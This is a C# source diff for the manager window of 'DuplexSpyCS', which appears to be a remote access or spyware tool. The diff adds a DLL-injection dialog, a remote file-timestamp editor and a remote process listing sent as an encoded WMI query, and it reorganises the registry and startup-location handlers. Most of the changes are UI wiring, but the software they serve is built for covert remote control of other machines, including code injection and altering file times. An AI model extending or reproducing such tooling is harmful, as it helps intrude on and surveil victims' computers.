@@ -14,6 +14,7 @@
  * 
  */
 
+using ICSharpCode.TextEditor.Document;
 using Microsoft.Win32;
 using System.Data;
 using System.Diagnostics;
@@ -1546,6 +1547,11 @@ namespace DuplexSpyCS
             f.Show();
         }
 
+        private void fnFileCopyPath()
+        {
+
+        }
+
         //OTHER FUNCTION
         /// <summary>
         /// Convert selected item in file ListView into List.
@@ -1620,6 +1626,15 @@ namespace DuplexSpyCS
                 return;
 
             f.Update(szUrl, szRmotePath, msg);
+        }
+
+        private bool fnItemIsFile(ListViewItem item)
+        {
+            if (item.Tag == null)
+                return false;
+
+            object[] aObj = (object[])item.Tag;
+            return aObj[1].ToString() == "f";
         }
 
         #endregion
@@ -1721,6 +1736,7 @@ namespace DuplexSpyCS
         {
             listView2.Columns.Clear();
             listView2.Items.Clear();
+            treeView2.Nodes.Clear();
 
             v.encSend(2, 0, $"task|init|{Crypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
         }
@@ -2028,6 +2044,8 @@ namespace DuplexSpyCS
             Serv_ReqInit();
             Window_ReqInit();
         }
+
+        #region Controls events
 
         private void frmManager_Load(object sender, EventArgs e)
         {
@@ -2580,6 +2598,8 @@ namespace DuplexSpyCS
             f.ShowDialog();
         }
 
+        #region Registry
+
         //Reg - Export
         private void toolStripMenuItem36_Click(object sender, EventArgs e)
         {
@@ -2682,28 +2702,6 @@ namespace DuplexSpyCS
             new Thread(() => Reg_ReqValueDelete(currentPath, keyNames)).Start();
         }
 
-        private void toolStripButton6_Click(object sender, EventArgs e)
-        {
-            File_FindStartup();
-        }
-
-        private void toolStripButton7_Click(object sender, EventArgs e)
-        {
-            Reg_FindStartup();
-        }
-
-        //Task - Dll Injection
-        private void toolStripMenuItem33_Click(object sender, EventArgs e)
-        {
-            OpenFileDialog ofd = new OpenFileDialog();
-            ofd.Filter = "DLL File (*.dll)|*.dll";
-            ofd.Multiselect = false;
-            if (ofd.ShowDialog() == DialogResult.OK)
-            {
-
-            }
-        }
-
         //Reg - Key Copy
         private void toolStripMenuItem43_Click(object sender, EventArgs e)
         {
@@ -2716,11 +2714,6 @@ namespace DuplexSpyCS
         }
         //Reg - Key Paste
         private void toolStripMenuItem45_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void treeView3_KeyDown(object sender, KeyEventArgs e)
         {
 
         }
@@ -2740,6 +2733,33 @@ namespace DuplexSpyCS
         {
 
         }
+
+        #endregion
+
+        private void toolStripButton6_Click(object sender, EventArgs e)
+        {
+            File_FindStartup();
+        }
+
+        private void toolStripButton7_Click(object sender, EventArgs e)
+        {
+            Reg_FindStartup();
+        }
+
+        //Task - Dll Injection
+        private void toolStripMenuItem33_Click(object sender, EventArgs e)
+        {
+            frmTaskDLLInjector f = new frmTaskDLLInjector();
+
+            f.Show();
+        }
+
+        private void treeView3_KeyDown(object sender, KeyEventArgs e)
+        {
+
+        }
+
+
 
         private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
         {
@@ -3096,6 +3116,29 @@ namespace DuplexSpyCS
                 int nHandle = int.Parse(item.SubItems[3].Text);
                 v.SendCommand($"thread|resume|{nHandle}");
             }
+        }
+
+        #endregion
+
+        private void toolStripMenuItem72_Click(object sender, EventArgs e)
+        {
+            string szCurrentPath = File_GetCurrentPath();
+
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                bool bFile = fnItemIsFile(item);
+                string szFileName = item.Text;
+
+                frmFileDatetime f = new frmFileDatetime(v, szCurrentPath, szFileName, bFile);
+                f.Show();
+            }
+        }
+
+        private void toolStripMenuItem73_Click(object sender, EventArgs e)
+        {
+            List<string> lEntity = listView1.SelectedItems.Cast<ListViewItem>().Select(x => ((object[])x.Tag)[0].ToString()).ToList();
+            Clipboard.SetText(string.Join("\n", lEntity));
+            MessageBox.Show($"Count: {lEntity.Count}", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
     }
 }
